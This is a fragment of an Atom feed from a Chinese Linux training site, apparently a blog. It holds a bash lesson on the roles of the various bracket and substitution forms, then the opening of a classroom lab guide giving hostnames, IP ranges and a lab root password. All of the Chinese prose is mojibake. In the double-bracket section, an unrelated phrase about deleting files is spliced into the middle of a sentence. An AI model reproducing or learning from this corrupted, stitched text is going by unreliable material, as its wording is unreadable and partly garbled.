      <category term="LinuxShellè„šæœ¬æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts ç¬¬äº”è¯¾ å„ç§æ‹¬å·çš„ä½œç”¨</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.755Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ä¸€ã€å°æ‹¬å·-åœ†æ‹¬å·"><a href="#ä¸€ã€å°æ‹¬å·-åœ†æ‹¬å·" class="headerlink" title="ä¸€ã€å°æ‹¬å·,åœ†æ‹¬å·()"></a>ä¸€ã€å°æ‹¬å·,åœ†æ‹¬å·()</h3><h4 id="1ã€å•å°æ‹¬å·"><a href="#1ã€å•å°æ‹¬å·" class="headerlink" title="1ã€å•å°æ‹¬å· ()"></a>1ã€å•å°æ‹¬å· ()</h4><p>1 å‘½ä»¤ç»„ã€‚æ‹¬å·ä¸­çš„å‘½ä»¤å°†ä¼šæ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œ,æ‰€ä»¥æ‹¬å·ä¸­çš„å˜é‡ä¸èƒ½å¤Ÿè¢«è„šæœ¬ä½™ä¸‹çš„éƒ¨åˆ†ä½¿ç”¨ã€‚æ‹¬å·ä¸­å¤šä¸ªå‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€,æœ€åä¸€ä¸ªå‘½ä»¤å¯ä»¥æ²¡æœ‰åˆ†å·,å„å‘½ä»¤å’Œæ‹¬å·ä¹‹é—´ä¸å¿…æœ‰ç©ºæ ¼ã€‚</p><p>2 å‘½ä»¤æ›¿æ¢ã€‚ç­‰åŒäº<code>cmd</code>,shellæ‰«æä¸€éå‘½ä»¤è¡Œ,å‘ç°äº†$(cmd)ç»“æ„,ä¾¿å°†$(cmd)ä¸­çš„cmdæ‰§è¡Œä¸€æ¬¡,å¾—åˆ°å…¶æ ‡å‡†è¾“å‡º,å†å°†æ­¤è¾“å‡ºæ”¾åˆ°åŸæ¥å‘½ä»¤ã€‚æœ‰äº›shellä¸æ”¯æŒ,å¦‚tcshã€‚</p><p>3 ç”¨äºåˆå§‹åŒ–æ•°ç»„ã€‚å¦‚:array=(a b c d)</p><h4 id="2ã€åŒå°æ‹¬å·"><a href="#2ã€åŒå°æ‹¬å·" class="headerlink" title="2ã€åŒå°æ‹¬å· (( ))"></a>2ã€åŒå°æ‹¬å· (( ))</h4><p>1 æ•´æ•°æ‰©å±•ã€‚è¿™ç§æ‰©å±•è®¡ç®—æ˜¯æ•´æ•°å‹çš„è®¡ç®—,ä¸æ”¯æŒæµ®ç‚¹å‹ã€‚((exp))ç»“æ„æ‰©å±•å¹¶è®¡ç®—ä¸€ä¸ªç®—æœ¯è¡¨è¾¾å¼çš„å€¼,å¦‚æœè¡¨è¾¾å¼çš„ç»“æœä¸º0,é‚£ä¹ˆè¿”å›çš„é€€å‡ºçŠ¶æ€ç ä¸º1,æˆ–è€… æ˜¯â€å‡â€,è€Œä¸€ä¸ªéé›¶å€¼çš„è¡¨è¾¾å¼æ‰€è¿”å›çš„é€€å‡ºçŠ¶æ€ç å°†ä¸º0,æˆ–è€…æ˜¯â€trueâ€ã€‚è‹¥æ˜¯é€»è¾‘åˆ¤æ–­,è¡¨è¾¾å¼expä¸ºçœŸåˆ™ä¸º1,å‡åˆ™ä¸º0ã€‚</p><p>2 åªè¦æ‹¬å·ä¸­çš„è¿ç®—ç¬¦ã€è¡¨è¾¾å¼ç¬¦åˆCè¯­è¨€è¿ç®—è§„åˆ™,éƒ½å¯ç”¨åœ¨$((exp))ä¸­,ç”šè‡³æ˜¯ä¸‰ç›®è¿ç®—ç¬¦ã€‚ä½œä¸åŒè¿›ä½(å¦‚äºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶)è¿ç®—æ—¶,è¾“å‡ºç»“æœå…¨éƒ½è‡ªåŠ¨è½¬åŒ–æˆäº†åè¿›åˆ¶ã€‚å¦‚:echo $((16#5f)) ç»“æœä¸º95(16è¿›ä½è½¬åè¿›åˆ¶)</p><p>3 å•çº¯ç”¨ (( )) ä¹Ÿå¯é‡å®šä¹‰å˜é‡å€¼,æ¯”å¦‚ a=5; ((a++)) å¯å°† $a é‡å®šä¹‰ä¸º6</p><p>4 å¸¸ç”¨äºç®—æœ¯è¿ç®—æ¯”è¾ƒ,åŒæ‹¬å·ä¸­çš„å˜é‡å¯ä»¥ä¸ä½¿ç”¨$ç¬¦å·å‰ç¼€ã€‚æ‹¬å·å†…æ”¯æŒå¤šä¸ªè¡¨è¾¾å¼ç”¨é€—å·åˆ†å¼€ã€‚ åªè¦æ‹¬å·ä¸­çš„è¡¨è¾¾å¼ç¬¦åˆCè¯­è¨€è¿ç®—è§„åˆ™,æ¯”å¦‚å¯ä»¥ç›´æ¥ä½¿ç”¨for((i=0;i&lt;5;i++)), å¦‚æœä¸ä½¿ç”¨åŒæ‹¬å·, åˆ™ä¸ºfor i in <code>seq 04</code>æˆ–è€…for i in {0..4}ã€‚å†å¦‚å¯ä»¥ç›´æ¥ä½¿ç”¨if (($i&lt;5)), å¦‚æœä¸ä½¿ç”¨åŒæ‹¬å·, åˆ™ä¸ºif [ $i -lt 5 ]ã€‚</p><h3 id="äºŒã€ä¸­æ‹¬å·-æ–¹æ‹¬å·"><a href="#äºŒã€ä¸­æ‹¬å·-æ–¹æ‹¬å·" class="headerlink" title="äºŒã€ä¸­æ‹¬å·,æ–¹æ‹¬å·[]"></a>äºŒã€ä¸­æ‹¬å·,æ–¹æ‹¬å·[]</h3><h4 id="1ã€å•ä¸­æ‹¬å·"><a href="#1ã€å•ä¸­æ‹¬å·" class="headerlink" title="1ã€å•ä¸­æ‹¬å· []"></a>1ã€å•ä¸­æ‹¬å· []</h4><p>1 bash çš„å†…éƒ¨å‘½ä»¤,[å’Œtestæ˜¯ç­‰åŒçš„ã€‚å¦‚æœæˆ‘ä»¬ä¸ç”¨ç»å¯¹è·¯å¾„æŒ‡æ˜,é€šå¸¸æˆ‘ä»¬ç”¨çš„éƒ½æ˜¯bashè‡ªå¸¦çš„å‘½ä»¤ã€‚if/testç»“æ„ä¸­çš„å·¦ä¸­æ‹¬å·æ˜¯è°ƒç”¨testçš„å‘½ä»¤æ ‡è¯†,å³ä¸­æ‹¬å·æ˜¯å…³é—­æ¡ä»¶åˆ¤æ–­çš„ã€‚è¿™ä¸ªå‘½ä»¤æŠŠå®ƒçš„å‚æ•°ä½œä¸ºæ¯”è¾ƒè¡¨è¾¾å¼æˆ–è€…ä½œä¸ºæ–‡ä»¶æµ‹è¯•,å¹¶ä¸”æ ¹æ®æ¯”è¾ƒçš„ç»“æœæ¥è¿”å›ä¸€ä¸ªé€€å‡ºçŠ¶æ€ç ã€‚if/testç»“æ„ä¸­å¹¶ä¸æ˜¯å¿…é¡»å³ä¸­æ‹¬å·,ä½†æ˜¯æ–°ç‰ˆçš„Bashä¸­è¦æ±‚å¿…é¡»è¿™æ ·ã€‚</p><p>2 Testå’Œ[]ä¸­å¯ç”¨çš„æ¯”è¾ƒè¿ç®—ç¬¦åªæœ‰==å’Œ!=,ä¸¤è€…éƒ½æ˜¯ç”¨äºå­—ç¬¦ä¸²æ¯”è¾ƒçš„,ä¸å¯ç”¨äºæ•´æ•°æ¯”è¾ƒ,æ•´æ•°æ¯”è¾ƒåªèƒ½ä½¿ç”¨-eq,-gtè¿™ç§å½¢å¼ã€‚æ— è®ºæ˜¯å­—ç¬¦ä¸²æ¯”è¾ƒè¿˜æ˜¯æ•´æ•°æ¯”è¾ƒéƒ½ä¸æ”¯æŒå¤§äºå·å°äºå·ã€‚å¦‚æœå®åœ¨æƒ³ç”¨,å¯¹äºå­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥ä½¿ç”¨è½¬ä¹‰å½¢å¼,å¦‚æœæ¯”è¾ƒâ€abâ€å’Œâ€bcâ€:[ ab &lt; bc ],ç»“æœä¸ºçœŸ,ä¹Ÿå°±æ˜¯è¿”å›çŠ¶æ€ä¸º0ã€‚[ ]ä¸­çš„é€»è¾‘ä¸å’Œé€»è¾‘æˆ–ä½¿ç”¨-a å’Œ-o è¡¨ç¤ºã€‚</p><p>3 å­—ç¬¦èŒƒå›´ã€‚ç”¨ä½œæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†,æè¿°ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦èŒƒå›´ã€‚ä½œä¸ºtestç”¨é€”çš„ä¸­æ‹¬å·å†…ä¸èƒ½ä½¿ç”¨æ­£åˆ™ã€‚</p><p>4 åœ¨ä¸€ä¸ªarray ç»“æ„çš„ä¸Šä¸‹æ–‡ä¸­,ä¸­æ‹¬å·ç”¨æ¥å¼•ç”¨æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ çš„ç¼–å·ã€‚</p><h4 id="2ã€åŒä¸­æ‹¬å·"><a href="#2ã€åŒä¸­æ‹¬å·" class="headerlink" title="2ã€åŒä¸­æ‹¬å·[[ ]]"></a>2ã€åŒä¸­æ‹¬å·[[ ]]</h4><p>1 [[æ˜¯ bash ç¨‹åºè¯­è¨€çš„å…³é”®å­—ã€‚å¹¶ä¸æ˜¯ä¸€ä¸ªå‘½ä»¤,[[ ]] ç»“æ„æ¯”[ ]ç»“æ„æ›´åŠ é€šç”¨ã€‚åœ¨[[å’Œ]]ä¹‹é—´æ‰€æœ‰çš„å­—ç¬¦éƒ½ä¸ä¼šå‘ç”Ÿæ–‡ä»¶åæ‰©å±•æˆ–è€…å•è¯åˆ†å‰²,ä½†æ˜¯ä¼šå‘ç”Ÿå‚æ•°æ‰©å±•å’Œå‘½ä»¤æ›¿æ¢ã€‚</p><p>2 æ”¯æŒå­—ç¬¦ä¸²çš„æ¨¡å¼åŒ¹é…,ä½¿ç”¨=~æ“ä½œç¬¦æ—¶ç”šè‡³æ”¯æŒshellçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶å¯ä»¥æŠŠå³è¾¹çš„ä½œä¸ºä¸€shellä¸­å„ç§æ‹¬å·çš„ä½œç”¨()ã€ä¸ªæ¨¡å¼,è€Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²,æ¯”å¦‚[[ hello == hell? ]],ç»“æœä¸ºçœŸã€‚[[ ]] ä¸­åŒ¹é…å­—ç¬¦ä¸²æˆ–é€šé…ç¬¦,ä¸éœ€è¦å¼•å·ã€‚</p><p>3 ä½¿ç”¨[[ â€¦ ]]æ¡ä»¶åˆ¤æ–­ç»“æ„,è€Œä¸æ˜¯[ â€¦ ],èƒ½å¤Ÿé˜²æ­¢è„šæœ¬ä¸­çš„è®¸å¤šé€»è¾‘é”™è¯¯ã€‚æ¯”å¦‚,&amp;&amp;ã€||ã€&lt;å’Œ&gt; æ“ä½œç¬¦èƒ½linux shellä¸‹é™¤äº†æŸä¸ªæ–‡ä»¶å¤–çš„å…¶ä»–æ–‡ä»¶å…¨éƒ¨åˆ é™¤å¤Ÿæ­£å¸¸å­˜åœ¨äº[[ ]]æ¡ä»¶åˆ¤æ–­ç»“æ„ä¸­,ä½†æ˜¯å¦‚æœå‡ºç°åœ¨[ ]ç»“æ„ä¸­çš„è¯,ä¼šæŠ¥é”™ã€‚æ¯”å¦‚å¯ä»¥ç›´æ¥ä½¿ç”¨if [[ $a != 1 &amp;&amp;$a != 2 ]], å¦‚æœä¸é€‚ç”¨åŒæ‹¬å·, åˆ™ä¸ºif [ $a -ne 1] &amp;&amp; [ $a != 2 ]æˆ–è€…if [ $a -ne 1 -a $a != 2 ]ã€‚</p><p>4 bashæŠŠåŒä¸­æ‹¬å·ä¸­çš„è¡¨è¾¾å¼çœ‹ä½œä¸€ä¸ªå•ç‹¬çš„å…ƒç´ ,å¹¶è¿”å›ä¸€ä¸ªé€€å‡ºçŠ¶æ€ç ã€‚</p><h3 id="ä¸‰ã€å¤§æ‹¬å·ã€èŠ±æ‹¬å·"><a href="#ä¸‰ã€å¤§æ‹¬å·ã€èŠ±æ‹¬å·" class="headerlink" title="ä¸‰ã€å¤§æ‹¬å·ã€èŠ±æ‹¬å· {}"></a>ä¸‰ã€å¤§æ‹¬å·ã€èŠ±æ‹¬å· {}</h3><h4 id="1ã€å¸¸è§„ç”¨æ³•"><a href="#1ã€å¸¸è§„ç”¨æ³•" class="headerlink" title="1ã€å¸¸è§„ç”¨æ³•"></a>1ã€å¸¸è§„ç”¨æ³•</h4><p>1 å¤§æ‹¬å·æ‹“å±•ã€‚(é€šé…(globbing))å°†å¯¹å¤§æ‹¬å·ä¸­çš„æ–‡ä»¶ååšæ‰©å±•ã€‚åœ¨å¤§æ‹¬å·ä¸­,ä¸å…è®¸æœ‰ç©ºç™½,é™¤éè¿™ä¸ªç©ºç™½è¢«å¼•ç”¨æˆ–è½¬ä¹‰ã€‚ç¬¬ä¸€ç§:å¯¹å¤§æ‹¬å·ä¸­çš„ä»¥é€—å·åˆ†å‰²çš„æ–‡ä»¶åˆ—è¡¨è¿›è¡Œæ‹“å±•ã€‚å¦‚ touch {a,b}.txt ç»“æœä¸ºa.txt b.txtã€‚ç¬¬äºŒç§:å¯¹å¤§æ‹¬å·ä¸­ä»¥ç‚¹ç‚¹(..)åˆ†å‰²çš„é¡ºåºæ–‡ä»¶åˆ—è¡¨èµ·æ‹“å±•ä½œç”¨,å¦‚:touch {a..d}.txt ç»“æœä¸ºa.txt b.txt c.txtd.txt</p><p>2 ä»£ç å—,åˆè¢«ç§°ä¸ºå†…éƒ¨ç»„,è¿™ä¸ªç»“æ„äº‹å®ä¸Šåˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå‡½æ•° ã€‚ä¸å°æ‹¬å·ä¸­çš„å‘½ä»¤ä¸åŒ,å¤§æ‹¬å·å†…çš„å‘½ä»¤ä¸ä¼šæ–°å¼€ä¸€ä¸ªå­shellè¿è¡Œ,å³è„šæœ¬ä½™ä¸‹éƒ¨åˆ†ä»å¯ä½¿ç”¨æ‹¬å·å†…å˜é‡ã€‚æ‹¬å·å†…çš„å‘½ä»¤é—´ç”¨åˆ†å·éš”å¼€,æœ€åä¸€ä¸ªä¹Ÿå¿…é¡»æœ‰åˆ†å·ã€‚{}çš„ç¬¬ä¸€ä¸ªå‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼</p><h4 id="2ã€å‡ ç§ç‰¹æ®Šçš„æ›¿æ¢ç»“æ„"><a href="#2ã€å‡ ç§ç‰¹æ®Šçš„æ›¿æ¢ç»“æ„" class="headerlink" title="2ã€å‡ ç§ç‰¹æ®Šçš„æ›¿æ¢ç»“æ„"></a>2ã€å‡ ç§ç‰¹æ®Šçš„æ›¿æ¢ç»“æ„</h4><p>${var:-string},${var:+string},${var:=string},${var:?string}</p><p>1 ${var:-string}å’Œ${var:=string}:è‹¥å˜é‡varä¸ºç©º,åˆ™ç”¨åœ¨å‘½ä»¤è¡Œä¸­ç”¨stringæ¥æ›¿æ¢${var:-string},å¦åˆ™å˜é‡varä¸ä¸ºç©ºæ—¶,åˆ™ç”¨å˜é‡varçš„å€¼æ¥æ›¿æ¢${var:-string};å¯¹äº${var:=string}çš„æ›¿æ¢è§„åˆ™å’Œ${var:-string}æ˜¯ä¸€æ ·çš„,æ‰€ä¸åŒä¹‹å¤„æ˜¯${var:=string}è‹¥varä¸ºç©ºæ—¶,ç”¨stringæ›¿æ¢${var:=string}çš„åŒæ—¶,æŠŠstringèµ‹ç»™å˜é‡var:${var:=string}å¾ˆå¸¸ç”¨çš„ä¸€ç§ç”¨æ³•æ˜¯,åˆ¤æ–­æŸä¸ªå˜é‡æ˜¯å¦èµ‹å€¼,æ²¡æœ‰çš„è¯åˆ™ç»™å®ƒèµ‹ä¸Šä¸€ä¸ªé»˜è®¤å€¼ã€‚</p><p>2 ${var:+string}çš„æ›¿æ¢è§„åˆ™å’Œä¸Šé¢çš„ç›¸å,å³åªæœ‰å½“varä¸æ˜¯ç©ºçš„æ—¶å€™æ‰æ›¿æ¢æˆstring,è‹¥varä¸ºç©ºæ—¶åˆ™ä¸æ›¿æ¢æˆ–è€…è¯´æ˜¯æ›¿æ¢æˆå˜é‡ varçš„å€¼,å³ç©ºå€¼ã€‚(å› ä¸ºå˜é‡varæ­¤æ—¶ä¸ºç©º,æ‰€ä»¥è¿™ä¸¤ç§è¯´æ³•æ˜¯ç­‰ä»·çš„)</p><p>3 ${var:?string}æ›¿æ¢è§„åˆ™ä¸º:è‹¥å˜é‡varä¸ä¸ºç©º,åˆ™ç”¨å˜é‡varçš„å€¼æ¥æ›¿æ¢${var:?string};è‹¥å˜é‡varä¸ºç©º,åˆ™æŠŠstringè¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯ä¸­,å¹¶ä»è„šæœ¬ä¸­é€€å‡ºã€‚æˆ‘ä»¬å¯åˆ©ç”¨æ­¤ç‰¹æ€§æ¥æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡çš„å€¼ã€‚</p><p>è¡¥å……æ‰©å±•:åœ¨ä¸Šé¢è¿™äº”ç§æ›¿æ¢ç»“æ„ä¸­stringä¸ä¸€å®šæ˜¯å¸¸å€¼çš„,å¯ç”¨å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼æˆ–æ˜¯ä¸€ç§å‘½ä»¤çš„è¾“å‡ºã€‚</p><h4 id="3ã€å››ç§æ¨¡å¼åŒ¹é…æ›¿æ¢ç»“æ„"><a href="#3ã€å››ç§æ¨¡å¼åŒ¹é…æ›¿æ¢ç»“æ„" class="headerlink" title="3ã€å››ç§æ¨¡å¼åŒ¹é…æ›¿æ¢ç»“æ„"></a>3ã€å››ç§æ¨¡å¼åŒ¹é…æ›¿æ¢ç»“æ„</h4><p>æ¨¡å¼åŒ¹é…è®°å¿†æ–¹æ³•:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> æ˜¯å»æ‰å·¦è¾¹(åœ¨é”®ç›˜ä¸Š<span class="comment">#åœ¨$ä¹‹å·¦è¾¹)</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"> æ˜¯å»æ‰å³è¾¹(åœ¨é”®ç›˜ä¸Š%åœ¨$ä¹‹å³è¾¹)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">å’Œ%ä¸­çš„å•ä¸€ç¬¦å·æ˜¯æœ€å°åŒ¹é…,ä¸¤ä¸ªç›¸åŒç¬¦å·æ˜¯æœ€å¤§åŒ¹é…ã€‚</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;var%pattern&#125;,<span class="variable">$&#123;var%%pattern&#125;</span>,<span class="variable">$&#123;var#pattern&#125;</span>,<span class="variable">$&#123;var##pattern&#125;</span></span></span><br></pre></td></tr></table></figure><h4 id="4ã€å­—ç¬¦ä¸²æå–å’Œæ›¿æ¢"><a href="#4ã€å­—ç¬¦ä¸²æå–å’Œæ›¿æ¢" class="headerlink" title="4ã€å­—ç¬¦ä¸²æå–å’Œæ›¿æ¢"></a>4ã€å­—ç¬¦ä¸²æå–å’Œæ›¿æ¢</h4><p>${var:num},${var:num1:num2},${var/pattern/pattern},${var//pattern/pattern}</p><ul><li>ç¬¬ä¸€ç§æ¨¡å¼:${var:num},è¿™ç§æ¨¡å¼æ—¶,shellåœ¨varä¸­æå–ç¬¬numä¸ªå­—ç¬¦åˆ°æœ«å°¾çš„æ‰€æœ‰å­—ç¬¦ã€‚è‹¥numä¸ºæ­£æ•°,ä»å·¦è¾¹0å¤„å¼€å§‹;è‹¥numä¸ºè´Ÿæ•°,ä»å³è¾¹å¼€å§‹æå–å­—ä¸²,ä½†å¿…é¡»ä½¿ç”¨åœ¨å†’å·åé¢åŠ ç©ºæ ¼æˆ–ä¸€ä¸ªæ•°å­—æˆ–æ•´ä¸ªnumåŠ ä¸Šæ‹¬å·,å¦‚${var: -2}ã€${var:1-3}æˆ–${var:(-2)}ã€‚</li><li>ç¬¬äºŒç§æ¨¡å¼:${var:num1:num2},num1æ˜¯ä½ç½®,num2æ˜¯é•¿åº¦ã€‚è¡¨ç¤ºä»$varå­—ç¬¦ä¸²çš„ç¬¬$num1ä¸ªä½ç½®å¼€å§‹æå–é•¿åº¦ä¸º$num2çš„å­ä¸²ã€‚ä¸èƒ½ä¸ºè´Ÿæ•°ã€‚</li><li>ç¬¬ä¸‰ç§æ¨¡å¼:${var/pattern/pattern}è¡¨ç¤ºå°†varå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªåŒ¹é…çš„patternæ›¿æ¢ä¸ºå¦ä¸€ä¸ªpatternã€‚ ã€‚</li><li>ç¬¬å››ç§æ¨¡å¼:${var//pattern/pattern}è¡¨ç¤ºå°†varå­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰èƒ½åŒ¹é…çš„patternæ›¿æ¢ä¸ºå¦ä¸€ä¸ªpatternã€‚</li></ul><h3 id="å››ã€ç¬¦å·-åçš„æ‹¬å·"><a href="#å››ã€ç¬¦å·-åçš„æ‹¬å·" class="headerlink" title="å››ã€ç¬¦å·$åçš„æ‹¬å·"></a>å››ã€ç¬¦å·$åçš„æ‹¬å·</h3><ul><li>(1) ${a} å˜é‡açš„å€¼, åœ¨ä¸å¼•èµ·æ­§ä¹‰çš„æƒ…å†µä¸‹å¯ä»¥çœç•¥å¤§æ‹¬å·ã€‚</li><li>(2) $(cmd) å‘½ä»¤æ›¿æ¢,å’Œ<code>cmd</code>æ•ˆæœç›¸åŒ,ç»“æœä¸ºshellå‘½ä»¤cmdçš„è¾“,è¿‡æŸäº›Shellç‰ˆæœ¬ä¸æ”¯æŒ$()å½¢å¼çš„å‘½ä»¤æ›¿æ¢, å¦‚tcshã€‚</li><li>(3) $((expression)) å’Œ<code>exprexpression</code>æ•ˆæœç›¸åŒ, è®¡ç®—æ•°å­¦è¡¨è¾¾å¼expçš„æ•°å€¼, å…¶ä¸­expåªè¦ç¬¦åˆCè¯­è¨€çš„è¿ç®—è§„åˆ™å³å¯, ç”šè‡³ä¸‰ç›®è¿ç®—ç¬¦å’Œé€»è¾‘è¡¨è¾¾å¼éƒ½å¯ä»¥è®¡ç®—ã€‚</li></ul><h3 id="äº”ã€ä½¿ç”¨å¤šæ¡å‘½ä»¤æ‰§è¡Œ"><a href="#äº”ã€ä½¿ç”¨å¤šæ¡å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="äº”ã€ä½¿ç”¨å¤šæ¡å‘½ä»¤æ‰§è¡Œ"></a>äº”ã€ä½¿ç”¨å¤šæ¡å‘½ä»¤æ‰§è¡Œ</h3><ul><li>(1)å•å°æ‹¬å·,(cmd1;cmd2;cmd3) æ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€,æœ€åä¸€ä¸ªå‘½ä»¤åå¯ä»¥æ²¡æœ‰åˆ†å·ã€‚</li><li>(2)å•å¤§æ‹¬å·,{ cmd1;cmd2;cmd3;} åœ¨å½“å‰shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¿…é¡»æœ‰åˆ†å·, ç¬¬ä¸€æ¡å‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»ç”¨ç©ºæ ¼éš”å¼€ã€‚å¯¹{}å’Œ()è€Œè¨€, æ‹¬å·ä¸­çš„é‡å®šå‘ç¬¦åªå½±å“è¯¥æ¡å‘½ä»¤, è€Œæ‹¬å·å¤–çš„é‡å®šå‘ç¬¦å½±å“åˆ°æ‹¬å·ä¸­çš„æ‰€æœ‰å‘½ä»¤ã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ä¸€ã€å°æ‹¬å·-åœ†æ‹¬å·&quot;&gt;&lt;a href=&quot;#ä¸€ã€å°æ‹¬å·-åœ†æ‹¬å·&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€å°æ‹¬å·,åœ†æ‹¬å·()&quot;&gt;&lt;/a&gt;ä¸€ã€å°æ‹¬å·,åœ†æ‹¬å·()&lt;/h3&gt;&lt;h4 id=&quot;1ã€å•å°æ‹¬å·&quot;&gt;&lt;a href=&quot;#1ã€å•å°æ‹¬å·&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX åŸºç¡€æœåŠ¡è¯¾ç¨‹ç¯å¢ƒä½¿ç”¨è¯´æ˜</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_easy_service/00_linux_classroom_env/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_easy_service/00_linux_classroom_env/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:02:31.699Z</updated>
    
    <content type="html"><![CDATA[<p>UP100 è¯¾ç¨‹åŸºäºRHEL6.5ã€RHEL7.0ã€ubuntu1604ã€WindowsXPå’ŒWindows2012R2ç³»ç»Ÿ</p><p>éœ€è¦å¼€å¯è™šæ‹Ÿæœºå¯ä»¥ç›´æ¥åŒå‡»å›¾æ ‡ï¼Œç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶å°†ä»è®²å¸ˆæœºä¸‹è½½æ˜ åƒæ–‡ä»¶ï¼Œå¯èƒ½ä¼šæ¯”è¾ƒæ…¢ã€‚</p><p>æ§åˆ¶è™šæ‹Ÿæœºå¯ä»¥ä½¿ç”¨kioskç”¨æˆ·ï¼Œæ‰§è¡Œrht-vmctlå‘½ä»¤ï¼Œè¯·è‡ªè¡ŒæŸ¥çœ‹å‘½ä»¤ä½¿ç”¨ã€‚</p><h3 id="æˆè¯¾ç½‘ç»œç¯å¢ƒé…ç½®å¦‚ä¸‹"><a href="#æˆè¯¾ç½‘ç»œç¯å¢ƒé…ç½®å¦‚ä¸‹" class="headerlink" title="æˆè¯¾ç½‘ç»œç¯å¢ƒé…ç½®å¦‚ä¸‹"></a>æˆè¯¾ç½‘ç»œç¯å¢ƒé…ç½®å¦‚ä¸‹</h3><p><strong>f0~fN</strong>ä¸ºæ•™å®¤ç‰©ç†æœºï¼Œå…¶åŸŸåä¸º<code>foundationN.ilt.example.com</code> ,å¯ç®€å†™ä¸º<code>fN</code>ã€‚å…¶IPä¸º<code>172.25.N.250</code>ï¼Œ<code>f0</code>ç‰¹æ®Šä¸º<code>172.25.254.250</code>ã€‚</p><p><code>classroom</code>è™šæ‹Ÿæœºä¸ºæ‰€æœ‰ç‰©ç†æœºå’Œè™šæ‹Ÿæœºçš„é»˜è®¤ç½‘å…³ï¼Œé…ç½®äº†å¤šä¸ªç½‘å¡è®¾ç½®äº†æ‰€æœ‰<code>172.25.N.254</code>çš„åœ°å€ï¼Œä¿è¯è™šæ‹Ÿæœºã€ç‰©ç†æœºå’Œå„ä¸ªå­¦ç”Ÿæœºä¹‹é—´çš„è·¯ç”±ã€‚é…ç½®äº†<code>DHCP</code>ã€<code>DNS</code>å’Œ<code>HTTP</code>æœåŠ¡ï¼Œå…¶åŸŸåä¸º<code>classroom.example.com</code>å¯ç®€å†™ä¸º<code>classroom</code>ã€‚</p><p>rhel6è™šæ‹Ÿæœºå‡å®‰è£…RHEL6.5ç³»ç»Ÿï¼Œrhel7è™šæ‹Ÿæœºå‡å®‰è£…RHEL7.0ç³»ç»Ÿï¼Œubuntu1604è™šæ‹Ÿæœºå‡å®‰è£…Ubuntu1604ç³»ç»Ÿï¼Œå‡å®‰è£…å›¾å½¢åŒ–ç•Œé¢å¹¶é…ç½®runlevel 5å¯åŠ¨ï¼Œrootå¯†ç ä¸ºuplooking ï¼Œé…ç½®äº†åŸºç¡€çš„YUMæºæŒ‡å‘classroomï¼Œ rhel6ã€rhel7ã€ubuntu1604ã€winxpå’Œwin2012r2è™šæ‹Ÿæœºå‡é…ç½®äº†1å—è™šæ‹Ÿæœºç½‘å¡ï¼Œeth0æ¥å…¥ç‰©ç†æœºbr0ç½‘æ¡¥ï¼ŒåŠ¨æ€è·å¾—ipåœ°å€:</p><table><thead><tr><th 